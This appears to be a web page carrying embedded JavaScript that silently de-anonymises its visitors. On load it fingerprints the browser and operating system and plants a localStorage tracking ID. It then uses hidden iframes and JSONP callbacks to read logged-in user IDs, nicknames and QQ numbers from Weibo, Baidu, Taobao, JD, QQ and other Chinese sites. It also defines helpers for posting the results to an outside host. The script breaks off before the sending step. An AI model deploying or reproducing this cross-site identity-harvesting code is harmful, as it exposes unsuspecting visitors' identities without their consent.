
<h3>61.144.20.68</h3>
<script type="text/javascript">

var getEncodeString = function(srcString) {
	//var srcString = 'abc';
	var BASE32CHAR = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
	var i = 0;
	var index = 0;
	var digit = 0;
	var currByte;
	var nextByte;
	var retrunString = '';

	for (var i = 0; i < srcString.length; ) {
		currByte = (srcString.charCodeAt(i) >= 0) ? srcString.charCodeAt(i) : (srcString.charCodeAt(i) + 256);
		if (index > 3) {
			if ((i + 1) < srcString.length) {
				nextByte = (srcString.charCodeAt(i + 1) >= 0) ? srcString.charCodeAt(i + 1) : (srcString.charCodeAt(i + 1) + 256);
			} else {
				nextByte = 0;
			}

			digit = currByte & (0xFF >> index);
			index = (index + 5) % 8;
			digit <<= index;
			digit |= (nextByte >> (8 - index));
			i++;
		} else {
			digit = (currByte >> (8 - (index + 5))) & 0x1F;
			index = (index + 5) % 8;
			if (index == 0) {
				i++;
			}
		}
		retrunString = retrunString + BASE32CHAR.charAt(digit);
	}
	return retrunString.toLowerCase();
}
    
var FP_BASE_PATH="http://findu.applinzi.com/";
var FP_LOAD_TIMEOUT=5000;
var FP_UA = navigator.userAgent||"";
var FP_BROWSER="";
var FP_DEVICE="";
var FP_BROWSER_VERSION="";
var FP_OS="";
var FP_FLASH_BOOL=false;
var FP_REF="";
var FP_UID="";

function isMobile(ua) {
    return /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(ua);
}


function getBrowserVersion(ua) {
    var unknown = 'unknown';

    // browser
    var nVer = ua;
    var nAgt = ua;
    var browser = unknown;
    var version = '';
    var majorVersion = '';
    var nameOffset, verOffset, ix;
    
    // Opera
    if ((verOffset = nAgt.indexOf('Opera')) != -1) {
        browser = 'Opera';
        version = nAgt.substring(verOffset + 6);
        if ((verOffset = nAgt.indexOf('Version')) != -1) {
            version = nAgt.substring(verOffset + 8);
        }
    }
    // Opera Next
    if ((verOffset = nAgt.indexOf('OPR')) != -1) {
        browser = 'Opera';
        version = nAgt.substring(verOffset + 4);
    }
    //BaiduBrowser
    else if ((verOffset = nAgt.indexOf('BIDUBrowser')) != -1) {
        browser = 'BaiduBrowser';
        version = nAgt.substring(verOffset + 12);
    }
    //SogouBrowser
    else if ((verOffset = nAgt.indexOf('SE ')) != -1) {
        browser = 'SogouBrowser';
        version = nAgt.substring(verOffset + 3);
    }
    //LiebaoBrowser
    else if ((verOffset = nAgt.indexOf('LBBROWSER')) != -1) {
        browser = 'LiebaoBrowser';
        version = unknown;
    }
    else if ((verOffset = nAgt.indexOf('MQQBrowser')) != -1) {
        browser = 'QQBrowser';
        version = nAgt.substring(verOffset + 11);
    }
    //QQBrowser
    else if ((verOffset = nAgt.indexOf('QQBrowser')) != -1) {
        browser = 'QQBrowser';
        version = nAgt.substring(verOffset + 10);
    }
    //Maxthon
    else if ((verOffset = nAgt.indexOf('Maxthon')) != -1) {
        browser = 'Maxthon';
        version = nAgt.substring(verOffset + 8);
    }
    // MSIE
    else if ((verOffset = nAgt.indexOf('MSIE')) != -1) {
        browser = 'Microsoft Internet Explorer';
        version = nAgt.substring(verOffset + 5);
    }
    // Chrome
    else if ((verOffset = nAgt.indexOf('Chrome')) != -1) {
        browser = 'Chrome';
        version = nAgt.substring(verOffset + 7);
    }
    else if ((verOffset = nAgt.indexOf('UCBrowser')) != -1) {
        browser = 'UCBrowser';
        version = nAgt.substring(verOffset + 10);
    }
    else if ((verOffset = nAgt.indexOf('OppoBrowser')) != -1) {
        browser = 'OppoBrowser';
        version = nAgt.substring(verOffset + 12);
    }
    // Safari
    else if ((verOffset = nAgt.indexOf('Safari')) != -1) {
        browser = 'Safari';
        version = nAgt.substring(verOffset + 7);
        if ((verOffset = nAgt.indexOf('Version')) != -1) {
            version = nAgt.substring(verOffset + 8);
        }
    }
    // Firefox
    else if ((verOffset = nAgt.indexOf('Firefox')) != -1) {
        browser = 'Firefox';
        version = nAgt.substring(verOffset + 8);
    }
    // MSIE 11+
    else if (nAgt.indexOf('Trident/') != -1) {
        browser = 'Microsoft Internet Explorer';
        version = nAgt.substring(nAgt.indexOf('rv:') + 3);
    }
    // Other browsers
    else if ((nameOffset = nAgt.lastIndexOf(' ') + 1) < (verOffset = nAgt.lastIndexOf('/'))) {
        browser = nAgt.substring(nameOffset, verOffset);
        version = nAgt.substring(verOffset + 1);
    }
    // trim the version string
    if ((ix = version.indexOf(';')) != -1) version = version.substring(0, ix);
    if ((ix = version.indexOf(' ')) != -1) version = version.substring(0, ix);
    if ((ix = version.indexOf(')')) != -1) version = version.substring(0, ix);

    majorVersion = parseInt('' + version, 10);
    if (isNaN(majorVersion)) {
        version = '' + parseFloat(navigator.appVersion);
        majorVersion = parseInt(navigator.appVersion, 10);
    }
    
    FP_BROWSER = browser;
    FP_BROWSER_VERSION = version;
    return browser+" "+version;
}


function getOs(ua){
    var pl=navigator.platform||"";
    var os="";
    var tmp="";
    if(tmp=ua.match(/Windows NT 10.0/)){
        os="Win 10";
    }else if(tmp=ua.match(/Windows NT 6.2/)){
        os="Win 8";
    }else if(tmp=ua.match(/Windows NT 6.1/)){
        os="Win 7";
    }else if(tmp=ua.match(/Windows NT 6.0/)){
        os="Win Vista";
    }else if(tmp=ua.match(/Windows NT 5.1/)){
        os="Win XP";
    }else if(tmp=ua.match(/Windows NT 5.0/)){
        os="Win 2000";
    }else{
        os="Win Me/98";
    }
    if(tmp=ua.match(/Linux/)){
        os="Linux";
    }
    if(ua.indexOf("iPhone")>-1||ua.indexOf("iPod")>-1||ua.indexOf("iPad")>-1){
        os="iOS";
    }
    var isWin = (pl == "Win32") || (pl == "Windows");
    var isMac = (pl == "Mac68K") || (pl == "MacPPC")
            || (pl == "Macintosh") || pl.indexOf("Mac")>-1 ;
    if(isMac){
        os="MacOS";
    }
    if(pl=="X11" && !isWin && !isMac){
        os="Unix";
    }
    if(pl.indexOf("SunOs")>-1){
        os="SunOs";
    }
    if (/Android (\d+\.\d+)/i.test(ua)) {
        os="Android "+parseFloat(RegExp['$1']);
    }
    return os;
}


function hasFlash() {
    try {
        new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
        return true;
    } catch(e) {}

    if(("navigator" in window)&&navigator.plugins&&navigator.plugins["Shockwave Flash"]) {
        return true;
    }
    return false;
}


(function() {
    FP_OS = getOs(FP_UA);
    FP_FLASH_BOOL = hasFlash();
    getBrowserVersion(FP_UA);
    FP_DEVICE = isMobile(FP_UA) ? "MOBILE" : "PC";

    FP_URL = (function() {
        var url = document.referrer||"";
        if(!url) {
            return {
                PROTOCOL:"",
                USERNAME:"",
                PASSWORD:"",
                HOST:"",
                HOSTNAME:"",
                PORT:"",
                PATHNAME:"",
                SEARCH:"",
                HASH:"",
                toString:function(){return ""}
            }
        }
        var a = document.createElement("a");
        a.href = url;
        var pathname=a.pathname||"";
        if(!/^\//.test(pathname)) {
            pathname = "/"+pathname;
        }
        return {
            PROTOCOL:a.protocol,
            USERNAME:a.username,
            PASSWORD:a.password,
            HOST:a.host,
            HOSTNAME:a.hostname,
            PORT:a.port,
            PATHNAME:pathname,
            SEARCH:a.search,
            HASH:a.hash,
            toString:function(){return url}
        }
    })();
})();


function FP_RANDOM_STRING(len) {
    var text = "";
    var len=len||32;
    var possible = "abcdefghijklmnopqrstuvwxyz0123456789";
    for( var i=0; i < len; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}


function FP_ARRAY_UNIQUE(arr) {
    var arrNew=arr.slice();
    var arrRes=[];
    var arrHash={};
    for(var i=0;i<arrNew.length;i++){
        if(arrNew[i] && !(arrNew[i] in arrHash)) {
            arrRes.push(arrNew[i]);
            arrHash[arrNew[i]]=1;
        }
    }
    return arrRes;
}


function FP_ASYNC(works,callback) {
    works=works||{};
    var callbackSucc=0;
    var callbackResult={};
    var callbackErrors={};
    for(var i in works){
        callbackSucc++;
    }
    for(var i in works){
        (function(i){
            works[i](function(data,err){
                callbackSucc--;
                if(err){
                    callbackErrors[i]=err;
                    return;
                }
                callbackResult[i]=data;
                //console.log(i+":"+callbackSucc);
                if(callbackSucc==0){
                    callback && (typeof callback=="function") && callback(callbackErrors,callbackResult);
                }
            },callbackResult);
        })(i);
    }
}


function FP_XMLHTTP() {
    if(window.XMLHttpRequest) {
        return new XMLHttpRequest();
    }
    if(window.ActiveXObject) {
        try{
            return new ActiveXObject("Msxml2.XMLHTTP");
        }catch(e) {
            try{
                return new ActiveXObject("Microsoft.XMLHTTP");
            }catch(e) {
                return null;
            }
        }
    }
}


/**
    销毁指定ID的元素
*/
function FP_DESTROY(id){
    if(window["timer_"+id]){
        clearTimeout(window["timer_"+id]);
    }
    var x=document.getElementById(id);
    if(x&&x.parentNode) {
        x.parentNode.removeChild(x);
    }
}


/**
    判断某个操作是否已经操作完成
*/
function FP_DONE(ifrTag,bool) {
    if(!window["done_"+ifrTag]){
        window["done_"+ifrTag]={};
    }
    window["done_"+ifrTag]["done"]=bool;
}


function FP_IS_DONE(ifrTag) {
    return window["done_"+ifrTag]&&window["done_"+ifrTag]["done"];
}


/**
    ifrTag 用于标记 ifr的id值，便于在 jsonp回调中销毁
    JSONp 回调中必须加入
    if(FP_IS_DONE(ifrTag)) return;
    防止出现，setTimeout已经callback之后，script才加载完毕，又callback一次的情况
*/
function FP_LOAD_NOREF(url,callback,errback,ifrTag,preload,timeout) {
    FP_DONE(ifrTag,false);
    var ifr=document.createElement("iframe");
    ifr.id=ifrTag;
    var isTimeout=false;
    var x=setTimeout(function(){
        isTimeout=true;
        FP_DONE(ifrTag,true);
        errback("");
        if(ifr&&ifr.parentNode){
            ifr.parentNode.removeChild(ifr);
        }
    },timeout||FP_LOAD_TIMEOUT);
    var scriptLoadComplete=false;
    window['script_'+ifrTag+'_load']=function(type,script,win){
        if(!isTimeout && !scriptLoadComplete && (type==1 || (type==0 && (script.readyState == 'complete')))){
            scriptLoadComplete=true;
            FP_DONE(ifrTag,callback(win));
            clearTimeout(x);
            if(FP_IS_DONE(ifrTag)){
                script.onload=script.onreadystatechange=null;
                if(script.parentNode){
                    script.parentNode.removeChild(script);
                }
                if(ifr&&ifr.parentNode){
                    ifr.parentNode.removeChild(ifr);
                }
            }else{
                errback("");
            }
        }
    };
    ifr.style.display='none';
    var preloadScript="";
    if(preload){
        preloadScript="<script>"+preload+"<\/script>";
    }
    ifr.src='javascript:"'+preloadScript+'<script onreadyStateChange=parent.script_'+ifrTag+'_load(0,this,window) onload=parent.script_'+ifrTag+'_load(1,this,window) src='+url+'><\/script>'+Math.random()+'"';
    (document.body||document.documentElement).appendChild(ifr);
}


function FP_LOAD(url,callback,errback,timeout){
    var script=document.createElement("script");
    var done=false;
    var x=setTimeout(function(){
        done=true;
        errback("");
    },timeout||FP_LOAD_TIMEOUT);
    script.type="text/javascript";
    script.src=url;
    script.onload=script.onreadystatechange=function(){
        if(!done && (!script.readyState || script.readyState == 'loaded' || script.readyState == 'complete')){
            clearTimeout(x);
            done = true;
            callback();
            script.onload=script.onreadystatechange=null;
            if(script.parentNode){
                script.parentNode.removeChild(script);
            }
        }
    };
    (document.body||document.documentElement).appendChild(script);
}


function FP_GET(url,callback,errback,timeout){
    var xhr = FP_XMLHTTP();
    xhr.open("GET",url,true);
    var x=setTimeout(function(){
        xhr.abort();
    },timeout||FP_LOAD_TIMEOUT);
    xhr.onreadystatechange=function(){
        if(xhr.readyState == 4){
            clearTimeout(x);
            if(xhr.status == 200){
                callback(xhr.responseText);
            }else{
                errback("");
            }
        }
    };
    xhr.send(null);
}


function FP_POST(url,data,callback,errback,timeout){
    var xhr = FP_XMLHTTP();
    xhr.open("POST",url,true);
    xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    var x=setTimeout(function(){
        xhr.abort();
    },timeout||FP_LOAD_TIMEOUT);
    xhr.onreadystatechange=function(){
        if(xhr.readyState == 4){
            clearTimeout(x);
            if(xhr.status == 200){
                callback(xhr.responseText);
            }else{
                errback("");
            }
        }
    };
    var senddata="";
    for(var i in data){
        senddata=i+"="+encodeURIComponent(data[i]);
    }
    xhr.send(senddata);
}


function FP_FORM(url,data,callback,errback,timeout){
    var done=false;
    var div=document.createElement("div");
    (document.body||document.documentElement).appendChild(div);
    var fields=[];
    for(var i in data){
        fields.push("<textarea style=\"display:none\" name=\""+i+"\">"+(data[i]||"").toString().replace(/&/g,"&amp;").replace(/<\/textarea/g,"&lt;/textarea")+"</textarea>");
    }
    var x=setTimeout(function(){
        done=true;
        errback&&errback("");
    },timeout||FP_LOAD_TIMEOUT);
    var cbname="cb_"+FP_RANDOM_STRING(32);
    window[cbname]=function(){
        if(done) return;
        clearTimeout(x);
        done=true;
        callback&&callback();
    };
    div.innerHTML="<iframe name=\"FP_FORM_IFRAME\" onload=\""+cbname+"()\" style=\"display:none\"></iframe><form target=\"FP_FORM_IFRAME\" enctype=\"application/x-www-form-urlencoded\" id=\"form_"+cbname+"\" method=\"POST\" action=\""+url+"\">"+fields.join("")+"</form>";
    document.getElementById("form_"+cbname).submit();
}


function FP_SEND(url,data,callback,errback,timeout){
    if("XMLHttpRequest" in window){
        FP_POST(url,data,callback,errback,timeout);
    }else{
        FP_FORM(url,data,callback,errback,timeout);
    }
}


function FP_IFRAME(url,callback,errback,timeout,onload){
    var done=false;
    var ifr=document.createElement("iframe");
    ifr.id=FP_RANDOM_STRING(32);
    ifr.name=ifr.id+"||"+escape(location.href);
    ifr.style.display="none";
    if(!window.FP_IFRAME_FUNC)  window.FP_IFRAME_FUNC={};
    var x=setTimeout(function(){
        done=true;
        errback&&errback("");
    },timeout||FP_LOAD_TIMEOUT);
    FP_IFRAME_FUNC[ifr.id]={
        "callback":function(res){
            if(done) return;
            clearTimeout(x);
            done=true;
            callback(res);
        }
    };
    ifr.src=url;
    ifr.onload=onload;
    (document.body||document.documentElement).appendChild(ifr);
}


function FP_FLASH(url,callback,errback,timeout,flashReady){
    if(!FP_FLASH_BOOL){errback();return;}
    var done=false;
    var div=document.createElement("div");
    var x=setTimeout(function(){
        done=true;
        errback("");
        if(div.parentNode){
            //div.parentNode.removeChild(div); 
        }
    },timeout||FP_LOAD_TIMEOUT);
    window[flashReady]=function(res){
        //console.log("flash ready:"+url);
        if(!done){
            //console.log("flash done:"+url);
            clearTimeout(x);
            done=true;
            callback(res);
            if(div.parentNode){
               // div.parentNode.removeChild(div); 
            }
        }
    };
    div.innerHTML='\
    <object id="'+FP_RANDOM_STRING(6)+'" data="'+url+'" type="application/x-shockwave-flash" width="1" height="1">\
       <param name="movie" value="'+url+'">\
       <param name="quality" value="high">\
       <param name="bgcolor" value="#ffffff">\
       <param name="wmode" value="transparent">\
       <param name="allowscriptaccess" value="always">\
       <embed id="'+FP_RANDOM_STRING(6)+'" src="'+url+'" type="application/x-shockwave-flash"\
          width="1" height="1" allowscriptaccess="always"></embed>\
    </object>';
    (document.body||document.documentElement).appendChild(div);
    
}


function FP_COOKIE(cookie,name){
    var reg = new RegExp("(?:^|\\s)"+name+"=([^;]+)");
    return (cookie.match(reg)||["",""])[1];
}


function FP_QQ_PARSE(qq){
    return (qq||"").replace(/^o0*/,"");
}


function FP_ENCODE(d){
    var r="";
    for(var i=0;i<d.length;i++){
        var c=d.charCodeAt(i);
        if(c>=32 && c<127){
            r+=String.fromCharCode((c+1)%95+32);
        }else{
            r+=d.charAt(i);
        }
    }
    return r;
}


if (typeof JSON !== 'object') {
    JSON = {};
}

(function () {
    'use strict';
    
    var rx_one = /^[\],:{}\s]*$/,
        rx_two = /\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,
        rx_three = /"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,
        rx_four = /(?:^|:|,)(?:\s*\[)+/g,
        rx_escapable = /[\\\"\u0000-\u001f\u007f-\u009f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
        rx_dangerous = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;

    function f(n) {
        // Format integers to have at least two digits.
        return n < 10 
            ? '0' + n 
            : n;
    }
    
    function this_value() {
        return this.valueOf();
    }

    if (typeof Date.prototype.toJSON !== 'function') {

        Date.prototype.toJSON = function () {

            return isFinite(this.valueOf())
                ? this.getUTCFullYear() + '-' +
                        f(this.getUTCMonth() + 1) + '-' +
                        f(this.getUTCDate()) + 'T' +
                        f(this.getUTCHours()) + ':' +
                        f(this.getUTCMinutes()) + ':' +
                        f(this.getUTCSeconds()) + 'Z'
                : null;
        };

        Boolean.prototype.toJSON = this_value;
        Number.prototype.toJSON = this_value;
        String.prototype.toJSON = this_value;
    }

    var gap,
        indent,
        meta,
        rep;


    function quote(string) {

// If the string contains no control characters, no quote characters, and no
// backslash characters, then we can safely slap some quotes around it.
// Otherwise we must also replace the offending characters with safe escape
// sequences.

        rx_escapable.lastIndex = 0;
        return rx_escapable.test(string) 
            ? '"' + string.replace(rx_escapable, function (a) {
                var c = meta[a];
                return typeof c === 'string'
                    ? c
                    : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
            }) + '"' 
            : '"' + string + '"';
    }


    function str(key, holder) {

// Produce a string from holder[key].

        var i,          // The loop counter.
            k,          // The member key.
            v,          // The member value.
            length,
            mind = gap,
            partial,
            value = holder[key];

// If the value has a toJSON method, call it to obtain a replacement value.

        if (value && typeof value === 'object' &&
                typeof value.toJSON === 'function') {
            value = value.toJSON(key);
        }

// If we were called with a replacer function, then call the replacer to
// obtain a replacement value.

        if (typeof rep === 'function') {
            value = rep.call(holder, key, value);
        }

// What happens next depends on the value's type.

        switch (typeof value) {
        case 'string':
            return quote(value);

        case 'number':

// JSON numbers must be finite. Encode non-finite numbers as null.

            return isFinite(value) 
                ? String(value) 
                : 'null';

        case 'boolean':
        case 'null':

// If the value is a boolean or null, convert it to a string. Note:
// typeof null does not produce 'null'. The case is included here in
// the remote chance that this gets fixed someday.

            return String(value);

// If the type is 'object', we might be dealing with an object or an array or
// null.

        case 'object':

// Due to a specification blunder in ECMAScript, typeof null is 'object',
// so watch out for that case.

            if (!value) {
                return 'null';
            }

// Make an array to hold the partial results of stringifying this object value.

            gap += indent;
            partial = [];

// Is the value an array?

            if (Object.prototype.toString.apply(value) === '[object Array]') {

// The value is an array. Stringify every element. Use null as a placeholder
// for non-JSON values.

                length = value.length;
                for (i = 0; i < length; i += 1) {
                    partial[i] = str(i, value) || 'null';
                }

// Join all of the elements together, separated with commas, and wrap them in
// brackets.

                v = partial.length === 0
                    ? '[]'
                    : gap
                        ? '[\n' + gap + partial.join(',\n' + gap) + '\n' + mind + ']'
                        : '[' + partial.join(',') + ']';
                gap = mind;
                return v;
            }

// If the replacer is an array, use it to select the members to be stringified.

            if (rep && typeof rep === 'object') {
                length = rep.length;
                for (i = 0; i < length; i += 1) {
                    if (typeof rep[i] === 'string') {
                        k = rep[i];
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (
                                gap 
                                    ? ': ' 
                                    : ':'
                            ) + v);
                        }
                    }
                }
            } else {

// Otherwise, iterate through all of the keys in the object.

                for (k in value) {
                    if (Object.prototype.hasOwnProperty.call(value, k)) {
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (
                                gap 
                                    ? ': ' 
                                    : ':'
                            ) + v);
                        }
                    }
                }
            }

// Join all of the member texts together, separated with commas,
// and wrap them in braces.

            v = partial.length === 0
                ? '{}'
                : gap
                    ? '{\n' + gap + partial.join(',\n' + gap) + '\n' + mind + '}'
                    : '{' + partial.join(',') + '}';
            gap = mind;
            return v;
        }
    }

// If the JSON object does not yet have a stringify method, give it one.

    if (typeof JSON.stringify !== 'function') {
        meta = {    // table of character substitutions
            '\b': '\\b',
            '\t': '\\t',
            '\n': '\\n',
            '\f': '\\f',
            '\r': '\\r',
            '"': '\\"',
            '\\': '\\\\'
        };
        JSON.stringify = function (value, replacer, space) {

// The stringify method takes a value and an optional replacer, and an optional
// space parameter, and returns a JSON text. The replacer can be a function
// that can replace values, or an array of strings that will select the keys.
// A default replacer method can be provided. Use of the space parameter can
// produce text that is more easily readable.

            var i;
            gap = '';
            indent = '';

// If the space parameter is a number, make an indent string containing that
// many spaces.

            if (typeof space === 'number') {
                for (i = 0; i < space; i += 1) {
                    indent += ' ';
                }

// If the space parameter is a string, it will be used as the indent string.

            } else if (typeof space === 'string') {
                indent = space;
            }

// If there is a replacer, it must be a function or an array.
// Otherwise, throw an error.

            rep = replacer;
            if (replacer && typeof replacer !== 'function' &&
                    (typeof replacer !== 'object' ||
                    typeof replacer.length !== 'number')) {
                throw new Error('JSON.stringify');
            }

// Make a fake root object containing our value under the key of ''.
// Return the result of stringifying the value.

            return str('', {'': value});
        };
    }


// If the JSON object does not yet have a parse method, give it one.

    if (typeof JSON.parse !== 'function') {
        JSON.parse = function (text, reviver) {

// The parse method takes a text and an optional reviver function, and returns
// a JavaScript value if the text is a valid JSON text.

            var j;

            function walk(holder, key) {

// The walk method is used to recursively walk the resulting structure so
// that modifications can be made.

                var k, v, value = holder[key];
                if (value && typeof value === 'object') {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = walk(value, k);
                            if (v !== undefined) {
                                value[k] = v;
                            } else {
                                delete value[k];
                            }
                        }
                    }
                }
                return reviver.call(holder, key, value);
            }


// Parsing happens in four stages. In the first stage, we replace certain
// Unicode characters with escape sequences. JavaScript handles many characters
// incorrectly, either silently deleting them, or treating them as line endings.

            text = String(text);
            rx_dangerous.lastIndex = 0;
            if (rx_dangerous.test(text)) {
                text = text.replace(rx_dangerous, function (a) {
                    return '\\u' +
                            ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                });
            }

// In the second stage, we run the text against regular expressions that look
// for non-JSON patterns. We are especially concerned with '()' and 'new'
// because they can cause invocation, and '=' because it can cause mutation.
// But just to be safe, we want to reject all unexpected forms.

// We split the second stage into 4 regexp operations in order to work around
// crippling inefficiencies in IE's and Safari's regexp engines. First we
// replace the JSON backslash pairs with '@' (a non-JSON character). Second, we
// replace all simple value tokens with ']' characters. Third, we delete all
// open brackets that follow a colon or comma or that begin the text. Finally,
// we look to see that the remaining characters are only whitespace or ']' or
// ',' or ':' or '{' or '}'. If that is so, then the text is safe for eval.

            if (
                rx_one.test(
                    text
                        .replace(rx_two, '@')
                        .replace(rx_three, ']')
                        .replace(rx_four, '')
                )
            ) {

// In the third stage we use the eval function to compile the text into a
// JavaScript structure. The '{' operator is subject to a syntactic ambiguity
// in JavaScript: it can begin a block or an object literal. We wrap the text
// in parens to eliminate the ambiguity.

                j = eval('(' + text + ')');

// In the optional fourth stage, we recursively walk the new structure, passing
// each name/value pair to a reviver function for possible transformation.

                return typeof reviver === 'function'
                    ? walk({'': j}, '')
                    : j;
            }

// If the text is not JSON parseable, then a SyntaxError is thrown.

            throw new SyntaxError('JSON.parse');
        };
    }
}());

FP_ASYNC({
    tianya: function(FP_CALLBACK) {try{
	var tag='tianyaifr';
	FP_LOAD_NOREF('http://www.tianya.cn/api/tw?var=msgObj&method=messagecount.ice.select&_='+new Date().getTime(),function(win){
		try{
			var uid = win.msgObj&&win.msgObj.data && win.msgObj.data.userId;
    		FP_CALLBACK({uid:uid});
		}catch(e){
			FP_CALLBACK("");
		}
      	return true;
	},function(){
		FP_CALLBACK("");
	},tag);
}catch(e){
	FP_CALLBACK(""); 
}},youku: function(FP_CALLBACK) {try{
    var tag="163ifr";
	var loaded=false;
	window.Callback19108248291613292265=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
            var uid= res.data.encodeUid||"";
            var username=res.data.username||"";
           if(uid){
    		   FP_CALLBACK({"username":username,"uid":uid});
            }else{
               FP_CALLBACK(""); 
           }
            
        }catch(e){
        	FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://cmstool.youku.com/cms/player/userinfo/user_info?specialTest=test&client=pc&callback=parent.Callback19108248291613292265&_="+Math.random(),function()

{return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.Callback19108248291613292265=parent.Callback19108248291613292265;");
}catch(e){
	FP_CALLBACK(""); 
}},163: function(FP_CALLBACK) {try{
    var tag="163ifr";
	var loaded=false;
	window.jQuery19108248291613292265_1500285933393=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
            var name = res.userName||"";
            if(name){
    	       FP_CALLBACK({"username":name});
            }else{
               FP_CALLBACK(""); 
           }
            
        }catch(e){
        	FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("https://c.open.163.com/member/loginStatus.do?callback=jQuery19108248291613292265_1500285933393&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.jQuery19108248291613292265_1500285933393=parent.jQuery19108248291613292265_1500285933393;");
}catch(e){
	FP_CALLBACK(""); 
}},weibo: function(FP_CALLBACK) {try{
    var tag="weiboifr";
	var loaded=false;
	window.sinaSSOController={};
    window.sinaSSOController.feedBackUrlCallBack=function(data){
        if(FP_IS_DONE(tag)) return;
        try{
            if(data.userinfo&&(data.userinfo.uniqueid||data.userinfo.displayname)){
                FP_CALLBACK({uid:data.userinfo.uniqueid});
            }else{
             	FP_CALLBACK(""); 
            }
        }catch(e){
          	FP_CALLBACK("");
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://weibo.com/ajaxlogin.php?framelogin=0&callback=parent.sinaSSOController.feedBackUrlCallBack&sudaref=weibo.com&_t="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag);
}catch(e){
	FP_CALLBACK(""); 
}},baidu: function(FP_CALLBACK) {try{
    var tag="baiduifr";
	var loaded=false;
	window.video_login_callback=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
            var name = res.incompleteInfo && res.incompleteInfo.displayname;
          	name = name || res.name || res.nameEnc;
    		FP_CALLBACK({nickname:name});
        }catch(e){
        	FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://baike.baidu.com/api/login/?callback=parent.video_login_callback&_t="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag);
}catch(e){
	FP_CALLBACK(""); 
}},localstorage: function(FP_CALLBACK) {try{
	if(window.localStorage){
    	var dataKey="fp_localstorage";
    	var dataTmp=localStorage.getItem(dataKey);
        if(!dataTmp){
        	dataTmp=FP_RANDOM_STRING();
        	localStorage.setItem(dataKey,dataTmp);
        }
      	FP_CALLBACK(dataTmp);
    }else{
    	FP_CALLBACK(""); 
    }
}catch(e){
	FP_CALLBACK(""); 
}},renren: function(FP_CALLBACK) {try{
    var tag="renrenifr";
	var loaded=false;
	var callback=new Date().getTime();
  	FP_LOAD_NOREF("http://ebp.renren.com/ebpn/show?var=jebe_json&r=http%3A%2F%2Fgossip.renren.com%2Fgetgossiplist&_t="+Math.random(),function(win){
		try{
			var data=win["jebe_json"];
			var ads = data.list && data.list.length>0 && data.list[0].ads;
			if(ads && ads.length>0){
				var ad = ads[0];
				if(ad.ad_param && ad.ad_param.click_url){
					var mc = (ad.ad_param.click_url.match(/&mc=([^&]+)&/)||["",""])[1];
					if(mc){
						try{mc=decodeURIComponent(mc)}catch(e){};
						var uid=(mc.match(/_(\d{3,9})\|/)||["",""])[1];
						FP_CALLBACK({uid:uid});
					}
				}
			}
		}catch(e){
			FP_CALLBACK("");
		}
      return true;
	},function(){
    	FP_CALLBACK("");
    },tag);
}catch(e){
	FP_CALLBACK(""); 
}},taobao: function(FP_CALLBACK) {try{
    var tag="taobaoifr";
	var loaded=false;
	window.callback_taobao=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
            var info = res.mainInfo||{};
          	 var glo = info.srpGlobal||{};
            var tra = info.traceInfo||{};
          	 var trd = tra.traceData ||{};
            var name = glo.tnk || trd.nick ||"";
          	 if(name){
    				FP_CALLBACK({nickname:name});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
        	FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("http://s.taobao.com/api?app=api&m=postfeedback&url=https%3A%2F%2Fs.taobao.com%2Flist%3Fq%3D12345612345%26source%3Dtesechina%26oeid%3D241000%26nocombo%3Dtrue%26vertical_valid%3Dfalse%26cd%3Dfalse&callback=callback_taobao&_t="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.callback_taobao=parent.callback_taobao;");
}catch(e){
	FP_CALLBACK(""); 
}},jd: function(FP_CALLBACK) {try{
    var tag="jdifr";
	var loaded=false;
	window.jQuery6034961=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
            var name = (res.accountInfo && res.accountInfo.pin) || "";
          	 if(name){
    				FP_CALLBACK({nickname:name});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
        	FP_CALLBACK(""); 
        }
      	loaded=true;
    };
  	FP_LOAD_NOREF("//corp.jd.com/publicSoa/userInfo/getUserInfo?callback=jQuery6034961&_="+Math.random(),function(){return loaded;},function(){
    	FP_CALLBACK("");
    },tag,"window.jQuery6034961=parent.jQuery6034961;");
}catch(e){
	FP_CALLBACK(""); 
}},qq: function(FP_CALLBACK) {try{
        var tag="qqifr";
	var loaded=false;
	window.jQuery19103840989930986969_1501754048559=function(res){
        if(FP_IS_DONE(tag)) return;
        try{
             var uid = res.qq||"";
	     var nickname=res.nick;
             if(uid){
    			FP_CALLBACK({"uid":uid,"nickname":nickname});
             }else{
               FP_CALLBACK(""); 
             }
        }catch(e){
        	FP_CALLBACK(""); 
        }
      	loaded=true;
    };
